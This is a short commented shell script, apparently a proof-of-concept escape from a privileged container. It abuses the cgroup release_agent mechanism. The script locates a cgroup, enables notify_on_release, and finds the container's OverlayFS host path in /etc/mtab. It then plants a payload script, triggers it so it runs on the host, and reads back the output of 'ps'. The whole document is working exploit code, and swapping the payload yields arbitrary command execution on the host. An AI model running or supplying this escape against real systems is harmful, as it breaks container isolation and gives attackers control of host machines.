# Finds + enables a cgroup release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# Enables notify_on_release in the cgroup
mkdir -p $d/w; echo 1 > $d/w/notify_on_release
# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent
# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c
# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1
# Reads the output
cat /o
